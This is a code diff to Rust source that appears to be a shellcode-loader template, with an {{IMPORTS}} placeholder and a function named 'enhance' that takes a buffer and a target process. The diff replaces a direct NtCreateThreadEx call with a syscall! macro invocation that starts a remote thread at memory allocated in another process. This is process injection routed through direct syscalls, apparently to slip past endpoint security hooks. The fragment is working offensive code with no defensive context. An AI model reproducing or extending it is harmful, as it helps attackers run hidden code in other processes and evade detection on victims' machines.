@@ -17,7 +17,8 @@ use winapi::{
     }
 };
 use ntapi::winapi::ctypes::c_void;
-use ntapi::ntpsapi::NtCreateThreadEx;
+use ntapi::ntpsapi::PS_ATTRIBUTE_LIST;
+//use ntapi::ntpsapi::NtCreateThreadEx;
 
 {{IMPORTS}}
 
@@ -77,24 +78,28 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
 
         let mut thread_handle : *mut c_void = null_mut();
         let handle = process_handle as *mut c_void;
-        let lol: *mut c_void = null_mut();
-        /* 
+        let lol1: *mut OBJECT_ATTRIBUTES = null_mut();
+        let lol2: *mut c_void = null_mut();
+        let lol3: *mut PS_ATTRIBUTE_LIST = null_mut();
+        
         let write_thread = syscall!(
             "NtCreateThreadEx",
             &mut thread_handle,
             MAXIMUM_ALLOWED, 
-            lol,
+            lol1,
             handle,
-            allocstart, 
-            lol,
+            mem::transmute(allocstart), 
+            lol2,
             0, 
             0, 
             0, 
             0, 
-            lol
+            lol3
         );
-        */
-        let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
+        
+        //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
+        //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, lol1, handle, allocstart, lol2, 0, 0, 0, 0, lol3);
+
         if !NT_SUCCESS(write_thread) {
             panic!("Error failed to create remote thread: {}", write_thread);
         }
